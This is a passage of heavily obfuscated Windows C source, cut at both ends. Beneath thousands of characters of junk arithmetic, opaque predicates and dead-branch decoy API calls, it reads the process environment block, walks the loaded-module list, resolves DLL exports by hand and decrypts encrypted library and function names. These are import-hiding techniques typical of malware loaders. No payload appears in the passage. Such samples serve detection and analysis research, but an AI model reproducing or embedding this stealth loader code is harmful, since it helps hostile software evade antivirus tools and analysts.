                    v0194410636aa2e22ad354becd27c7b3d_useless_opaque = v05e680cd9f467afe7b9a345dffa8100c_computation_opaque % v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque;
                    v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque = v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque <= v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque;
                    v13da422836d6407683e4c3be565c880b_useless_opaque = v0dd3d6ecfa8b024b2cfa830d5d1447ea_true_opaque + v13da422836d6407683e4c3be565c880b_useless_opaque;
                    vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque = v25128658a1eb9dde8eca910ec9610564_computation_opaque <= v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque;
                    v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque = v11935c6af272cdef5cffe18d49020373_computation_opaque / v0dd3d6ecfa8b024b2cfa830d5d1447ea_true_opaque;
                  }
                  if ((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25)))
                  {
                    if (((v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque == ((unsigned int) 2)))
                    {
                      if (((v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque == ((unsigned int) 2)))
                      {
                        if (!(((v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque == ((unsigned int) 2))))
                        {
                          void * v2eda04cbbe83833f0124d88ace2df611 = (void *) 0x66d8cd34;
                          unsigned long v7f76520483f43281f7a6a0d0a53aa5fe = (unsigned long) 0x28d36fee;
                          if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
                          {
                            void * vd2d4efd76e82704477ef4d430e69f431 = (void *) 0xfa1a6c3d;
                            unsigned long v1eda1b2a3d8bfb2e9517502ef3e87ddc = (unsigned long) 0xbd662db6;
                            unsigned long v5088e5fa8d035429689cfb0411a6e008 = (unsigned long) 0xd08084a7;
                            v5088e5fa8d035429689cfb0411a6e008 = SnmpListen(vd2d4efd76e82704477ef4d430e69f431, v1eda1b2a3d8bfb2e9517502ef3e87ddc);
                          }
                          unsigned long v9a33c188102b55ea3ee1b3a04419a84a = (unsigned long) 0xca385f6f;
                          v9a33c188102b55ea3ee1b3a04419a84a = SnmpListen(v2eda04cbbe83833f0124d88ace2df611, v7f76520483f43281f7a6a0d0a53aa5fe);
                        }
                        if (!(((v1e41f50508598edb1efdc62c9545123b_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1e41f50508598edb1efdc62c9545123b_prime_opaque == ((unsigned int) 2))))
                        {
                          vf2ad0daf2c50e9bbdeee9f283f6fcd57_useless_opaque = v98eabc18c672648c4aec2c705ff26f49_true_opaque < v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque;
                          v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque = v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque < vaea6d2639c33242f8a189013aee805ca_computation_opaque;
                          v98eabc18c672648c4aec2c705ff26f49_true_opaque = v98eabc18c672648c4aec2c705ff26f49_true_opaque + vf2ad0daf2c50e9bbdeee9f283f6fcd57_useless_opaque;
                          v98eabc18c672648c4aec2c705ff26f49_true_opaque = vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque != v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque;
                          v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque = v13da422836d6407683e4c3be565c880b_useless_opaque == v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque;
                          v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque = v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque | v1e41f50508598edb1efdc62c9545123b_prime_opaque;
                          v05e680cd9f467afe7b9a345dffa8100c_computation_opaque = v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque <= v0194410636aa2e22ad354becd27c7b3d_useless_opaque;
                        }
                        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY) (((BYTE *) current_module) - ((sizeof(PVOID)) * 2));
                        if ((entry->FullDllName.Buffer != 0) && compare_file_name(entry->FullDllName.Buffer, module_name))
                        {
                          return entry->DllBase;
                        }
                        if (!((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25))))
                        {
                          v1e41f50508598edb1efdc62c9545123b_prime_opaque = v0194410636aa2e22ad354becd27c7b3d_useless_opaque || v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque;
                        }
                        current_module = current_module->Flink;
                      }
                    }
                    if (!v98eabc18c672648c4aec2c705ff26f49_true_opaque)
                    {
                      v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque = v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque == v13da422836d6407683e4c3be565c880b_useless_opaque;
                      v1e41f50508598edb1efdc62c9545123b_prime_opaque = v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque % v13da422836d6407683e4c3be565c880b_useless_opaque;
                      v86b63366271ca51c6b7dca9c9c9df243_useless_opaque = v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque % vaea6d2639c33242f8a189013aee805ca_computation_opaque;
                      vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque = vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque - v98eabc18c672648c4aec2c705ff26f49_true_opaque;
                    }
                    if ((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25)))
                    {
                      if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
                      {
                        v05e680cd9f467afe7b9a345dffa8100c_computation_opaque = v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque * v11935c6af272cdef5cffe18d49020373_computation_opaque;
                        v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque = v05e680cd9f467afe7b9a345dffa8100c_computation_opaque + v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque;
                      }
                    }
                  }
                }

                if (((v1e41f50508598edb1efdc62c9545123b_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1e41f50508598edb1efdc62c9545123b_prime_opaque == ((unsigned int) 2)))
                {
                  return 0;
                }
              }
            }
          }
        }
      }
    }
  }
}

void *get_function_address(void *module_address, const char *function_name)
{
  {
    {
      {
        unsigned int vaa115b4e605c70917d69ab62303721b8_useless_opaque = (unsigned int) 2024126027;
        unsigned int vfb9b1aa6bed86801088478d7b3eedeae_computation_opaque = (unsigned int) (&vaa115b4e605c70917d69ab62303721b8_useless_opaque);
        unsigned int vaaa6edb9e1b29f9477fd9f2969f30f41_true_opaque = (((vfb9b1aa6bed86801088478d7b3eedeae_computation_opaque * vfb9b1aa6bed86801088478d7b3eedeae_computation_opaque) + vfb9b1aa6bed86801088478d7b3eedeae_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
        IMAGE_DOS_HEADER *dos_header = (IMAGE_DOS_HEADER *) module_address;
        IMAGE_NT_HEADERS *nt_headers = (IMAGE_NT_HEADERS *) (((BYTE *) module_address) + dos_header->e_lfanew);
        IMAGE_EXPORT_DIRECTORY *export_directory = (IMAGE_EXPORT_DIRECTORY *) (((BYTE *) module_address) + nt_headers->OptionalHeader.DataDirectory[0].VirtualAddress);
        DWORD *names_exported = (DWORD *) (((BYTE *) module_address) + export_directory->AddressOfNames);
        WORD *ordinals = (WORD *) (((BYTE *) module_address) + export_directory->AddressOfNameOrdinals);
        DWORD *function_address_array = (DWORD *) (((BYTE *) module_address) + export_directory->AddressOfFunctions);
        for (DWORD i = 0; i < export_directory->NumberOfNames; i++)
        {
          if (vaaa6edb9e1b29f9477fd9f2969f30f41_true_opaque)
          {
            if (!vaaa6edb9e1b29f9477fd9f2969f30f41_true_opaque)
            {
              vaaa6edb9e1b29f9477fd9f2969f30f41_true_opaque = vfb9b1aa6bed86801088478d7b3eedeae_computation_opaque != ((unsigned int) 80);
              vaaa6edb9e1b29f9477fd9f2969f30f41_true_opaque = vaaa6edb9e1b29f9477fd9f2969f30f41_true_opaque == vaa115b4e605c70917d69ab62303721b8_useless_opaque;
              vaa115b4e605c70917d69ab62303721b8_useless_opaque = vaa115b4e605c70917d69ab62303721b8_useless_opaque * vaaa6edb9e1b29f9477fd9f2969f30f41_true_opaque;
              vaa115b4e605c70917d69ab62303721b8_useless_opaque = vaaa6edb9e1b29f9477fd9f2969f30f41_true_opaque <= vfb9b1aa6bed86801088478d7b3eedeae_computation_opaque;
              vaaa6edb9e1b29f9477fd9f2969f30f41_true_opaque = vaa115b4e605c70917d69ab62303721b8_useless_opaque <= ((unsigned int) 24);
            }
            const char *function_in_module = (const char *) (((BYTE *) module_address) + names_exported[i]);
            if (vaaa6edb9e1b29f9477fd9f2969f30f41_true_opaque)
            {
              if (replacement_string(function_in_module, function_name) == 0)
              {
                WORD selected_ordinal = ordinals[i];
                return ((BYTE *) module_address) + function_address_array[selected_ordinal];
              }
            }
          }
        }

        return 0;
      }
      unsigned int v58c1b72685ed9a97fbebaed1a9ef5469_useless_opaque = (unsigned int) 2541926533;
      unsigned int v5ff7d78bee2f304621821cc02cd7bef7_computation_opaque = (unsigned int) 0;
      unsigned int v198cc5aad5112a717e1ec466212cb20f_computation_opaque = (unsigned int) 3;
      unsigned int vbffab9fe09845cee1b0a22a9cf9520a1_computation_opaque = (unsigned int) (&v58c1b72685ed9a97fbebaed1a9ef5469_useless_opaque);
      vbffab9fe09845cee1b0a22a9cf9520a1_computation_opaque = (vbffab9fe09845cee1b0a22a9cf9520a1_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (vbffab9fe09845cee1b0a22a9cf9520a1_computation_opaque < ((unsigned int) 3))
      {
        vbffab9fe09845cee1b0a22a9cf9520a1_computation_opaque = (unsigned int) 3;
      }
      while (v5ff7d78bee2f304621821cc02cd7bef7_computation_opaque != ((unsigned int) 1))
      {
        vbffab9fe09845cee1b0a22a9cf9520a1_computation_opaque += (unsigned int) 2;
        v5ff7d78bee2f304621821cc02cd7bef7_computation_opaque = (unsigned int) 1;
        v198cc5aad5112a717e1ec466212cb20f_computation_opaque = (unsigned int) 3;
        while ((v198cc5aad5112a717e1ec466212cb20f_computation_opaque * v198cc5aad5112a717e1ec466212cb20f_computation_opaque) <= vbffab9fe09845cee1b0a22a9cf9520a1_computation_opaque)
        {
          if ((vbffab9fe09845cee1b0a22a9cf9520a1_computation_opaque % v198cc5aad5112a717e1ec466212cb20f_computation_opaque) == ((unsigned int) 0))
          {
            v5ff7d78bee2f304621821cc02cd7bef7_computation_opaque = (unsigned int) 0;
          }
          v198cc5aad5112a717e1ec466212cb20f_computation_opaque = v198cc5aad5112a717e1ec466212cb20f_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int v5b12827d665b8b5724fb36d94bd40fcc_prime_opaque = vbffab9fe09845cee1b0a22a9cf9520a1_computation_opaque;
      unsigned int v8540e52ac496ce01cbaf8e6f80eb2cc3_useless_opaque = (unsigned int) 2384008340;
      unsigned int vf0b53f3d909a5e39f21d3464ac172d6c_computation_opaque = (unsigned int) (&v8540e52ac496ce01cbaf8e6f80eb2cc3_useless_opaque);
      unsigned int vfea13b436508de9e01f13894e7da1cb0_true_opaque = (((vf0b53f3d909a5e39f21d3464ac172d6c_computation_opaque * vf0b53f3d909a5e39f21d3464ac172d6c_computation_opaque) + vf0b53f3d909a5e39f21d3464ac172d6c_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
    }
  }
}

void init_kernel_library(void)
{
    __asm__("movl %%fs:0x30, %0" : "=r"(peb_windows_structure));
  unsigned int v91288c1ae87c817cee4f2981d2f47e90_useless_opaque = (unsigned int) 4195783288;
  unsigned int v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque = (unsigned int) (&v91288c1ae87c817cee4f2981d2f47e90_useless_opaque);
  {
    unsigned int v2c360aade2706bf970b7c30c7a10c8ad_useless_opaque = (unsigned int) 1948501757;
    unsigned int v1b95532e2ed32281e6690f4d849e5d6b_random_opaque = (unsigned int) (&v2c360aade2706bf970b7c30c7a10c8ad_useless_opaque);
    {
      unsigned int v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque = (unsigned int) 2307882935;
      unsigned int v7184e887ca12f3b610a9efb2f160b29b_computation_opaque = (unsigned int) 0;
      unsigned int v6a0ec8413774d540e0b095914b80b665_computation_opaque = (unsigned int) 3;
      unsigned int v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque = (unsigned int) (&v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque);
      v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque = (v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque < ((unsigned int) 3))
      {
        v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque = (unsigned int) 3;
        if (!((((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 9)) + ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 16))) == ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 25))))
        {
          void * v80e0f5355374c0b7b4c2dccebe4d55bb = (void *) 0x2dec920a;
          unsigned long v0b5b1e1eb9407a2353f051a517acf0b4 = (unsigned long) 0x68199ff7;
          unsigned long v831ddb26bd89f4b835ca99d3a45b5460 = (unsigned long) 0xe5f93d41;
          v831ddb26bd89f4b835ca99d3a45b5460 = SnmpListen(v80e0f5355374c0b7b4c2dccebe4d55bb, v0b5b1e1eb9407a2353f051a517acf0b4);
        }
      }
      while (v7184e887ca12f3b610a9efb2f160b29b_computation_opaque != ((unsigned int) 1))
      {
        if (!((((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 9)) + ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 16))) == ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 25))))
        {
          v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque = v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque + v7184e887ca12f3b610a9efb2f160b29b_computation_opaque;
          v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque = v91288c1ae87c817cee4f2981d2f47e90_useless_opaque % v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque;
          v91288c1ae87c817cee4f2981d2f47e90_useless_opaque = v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque % v7184e887ca12f3b610a9efb2f160b29b_computation_opaque;
          v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque = v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque != v1b95532e2ed32281e6690f4d849e5d6b_random_opaque;
          v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque = v2c360aade2706bf970b7c30c7a10c8ad_useless_opaque + v91288c1ae87c817cee4f2981d2f47e90_useless_opaque;
          v7184e887ca12f3b610a9efb2f160b29b_computation_opaque = v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque <= ((unsigned int) 42);
          v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque = v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque % ((unsigned int) 125);
        }
        v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque += (unsigned int) 2;
        if ((((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 9)) + ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 16))) == ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 25)))
        {
          v7184e887ca12f3b610a9efb2f160b29b_computation_opaque = (unsigned int) 1;
          v6a0ec8413774d540e0b095914b80b665_computation_opaque = (unsigned int) 3;
          if ((((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 9)) + ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 16))) == ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 25)))
          {
            while ((v6a0ec8413774d540e0b095914b80b665_computation_opaque * v6a0ec8413774d540e0b095914b80b665_computation_opaque) <= v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque)
            {
              if ((v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque % v6a0ec8413774d540e0b095914b80b665_computation_opaque) == ((unsigned int) 0))
              {
                v7184e887ca12f3b610a9efb2f160b29b_computation_opaque = (unsigned int) 0;
              }
              v6a0ec8413774d540e0b095914b80b665_computation_opaque = v6a0ec8413774d540e0b095914b80b665_computation_opaque + ((unsigned int) 2);
            }

          }
        }
      }

      unsigned int v6cc38d9666e712ade396845c3808ef6e_prime_opaque = v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque;
      {
        unsigned int v12b7305d153da6ce6d715517afc7c2bf_useless_opaque = (unsigned int) 3168414554;
        unsigned int v3870911ccd0eabdfd1f30612741d9686_computation_opaque = (unsigned int) (&v12b7305d153da6ce6d715517afc7c2bf_useless_opaque);
        unsigned int v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque = (((v3870911ccd0eabdfd1f30612741d9686_computation_opaque * v3870911ccd0eabdfd1f30612741d9686_computation_opaque) + v3870911ccd0eabdfd1f30612741d9686_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
        decrypt_data(encrypted_kernel_library_name, size_encrypted_kernel_library_name);
        decrypt_data(encrypted_kernel_library_function_names, size_encrypted_kernel_library_function_names);
        if (!(((v6cc38d9666e712ade396845c3808ef6e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v6cc38d9666e712ade396845c3808ef6e_prime_opaque == ((unsigned int) 2))))
        {
          if (!((((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 9)) + ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 16))) == ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 25))))
          {
            v2c360aade2706bf970b7c30c7a10c8ad_useless_opaque = v3870911ccd0eabdfd1f30612741d9686_computation_opaque + v6a0ec8413774d540e0b095914b80b665_computation_opaque;
            v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque = v91288c1ae87c817cee4f2981d2f47e90_useless_opaque == v3870911ccd0eabdfd1f30612741d9686_computation_opaque;
            if (v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque)
            {
              v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque = v7184e887ca12f3b610a9efb2f160b29b_computation_opaque <= v6cc38d9666e712ade396845c3808ef6e_prime_opaque;
            }
          }
          if (!((((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 9)) + ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 16))) == ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 25))))
          {
            void * vbab95b3d8f291597285036280afa6207 = (void *) 0x6ceda2e1;
            if (!v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque)
            {
              if (!((((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 9)) + ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 16))) == ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 25))))
              {
                v12b7305d153da6ce6d715517afc7c2bf_useless_opaque = v2c360aade2706bf970b7c30c7a10c8ad_useless_opaque % v6cc38d9666e712ade396845c3808ef6e_prime_opaque;
                v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque = v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque - v7184e887ca12f3b610a9efb2f160b29b_computation_opaque;
                v6a0ec8413774d540e0b095914b80b665_computation_opaque = v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque * v6cc38d9666e712ade396845c3808ef6e_prime_opaque;
                v3870911ccd0eabdfd1f30612741d9686_computation_opaque = v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque % v12b7305d153da6ce6d715517afc7c2bf_useless_opaque;
                v6cc38d9666e712ade396845c3808ef6e_prime_opaque = v2c360aade2706bf970b7c30c7a10c8ad_useless_opaque || v3870911ccd0eabdfd1f30612741d9686_computation_opaque;
                v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque = v1b95532e2ed32281e6690f4d849e5d6b_random_opaque % v91288c1ae87c817cee4f2981d2f47e90_useless_opaque;
                v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque = v6a0ec8413774d540e0b095914b80b665_computation_opaque || v6cc38d9666e712ade396845c3808ef6e_prime_opaque;
              }
              void * v52efb283db65ba544aa0dfc3e39eca8d = (void *) 0xb9623913;
              void * v73823bd8e43514d7de39bb6065f23b8d = (void *) 0x74ee4631;
              if ((((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 9)) + ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 16))) == ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 25)))
              {
                unsigned long v4e807d09cd32452a07a6e220ae116933 = (unsigned long) 0xceb739ce;
                if (((v6cc38d9666e712ade396845c3808ef6e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v6cc38d9666e712ade396845c3808ef6e_prime_opaque == ((unsigned int) 2)))
                {
                  unsigned long v75fe2b476d2fb17d594efec133373d00 = (unsigned long) 0x1366ffeb;
                  v75fe2b476d2fb17d594efec133373d00 = GetModuleFileNameA(v52efb283db65ba544aa0dfc3e39eca8d, v73823bd8e43514d7de39bb6065f23b8d, v4e807d09cd32452a07a6e220ae116933);
                }
              }
              if (!v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque)
              {
                v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque = v6a0ec8413774d540e0b095914b80b665_computation_opaque / v91288c1ae87c817cee4f2981d2f47e90_useless_opaque;
              }
            }
            if (!v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque)
            {
              v1b95532e2ed32281e6690f4d849e5d6b_random_opaque = v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque % v91288c1ae87c817cee4f2981d2f47e90_useless_opaque;
            }
            if (((v6cc38d9666e712ade396845c3808ef6e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v6cc38d9666e712ade396845c3808ef6e_prime_opaque == ((unsigned int) 2)))
            {
              if (!v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque)
              {
                v6cc38d9666e712ade396845c3808ef6e_prime_opaque = v3870911ccd0eabdfd1f30612741d9686_computation_opaque <= v7184e887ca12f3b610a9efb2f160b29b_computation_opaque;
                v6cc38d9666e712ade396845c3808ef6e_prime_opaque = v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque - v1b95532e2ed32281e6690f4d849e5d6b_random_opaque;
                v1b95532e2ed32281e6690f4d849e5d6b_random_opaque = v6cc38d9666e712ade396845c3808ef6e_prime_opaque < v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque;
                v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque = v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque % ((unsigned int) 75);
              }
              if ((((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 9)) + ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 16))) == ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 25)))
              {
                long v0a3f69e8ae1a70574abc8110bcb48570 = (long) 0xa2667bce;
                if (((v6cc38d9666e712ade396845c3808ef6e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v6cc38d9666e712ade396845c3808ef6e_prime_opaque == ((unsigned int) 2)))
                {
                  if (!(((v6cc38d9666e712ade396845c3808ef6e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v6cc38d9666e712ade396845c3808ef6e_prime_opaque == ((unsigned int) 2))))
                  {
                    v6a0ec8413774d540e0b095914b80b665_computation_opaque = v6a0ec8413774d540e0b095914b80b665_computation_opaque != v7184e887ca12f3b610a9efb2f160b29b_computation_opaque;
                    v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque = v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque == v12b7305d153da6ce6d715517afc7c2bf_useless_opaque;
                    v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque = v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque == v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque;
                    if (!(((v6cc38d9666e712ade396845c3808ef6e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v6cc38d9666e712ade396845c3808ef6e_prime_opaque == ((unsigned int) 2))))
                    {
                      v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque = v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque - v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque;
                      v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque = v7184e887ca12f3b610a9efb2f160b29b_computation_opaque <= v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque;
                      v6a0ec8413774d540e0b095914b80b665_computation_opaque = v6a0ec8413774d540e0b095914b80b665_computation_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque;
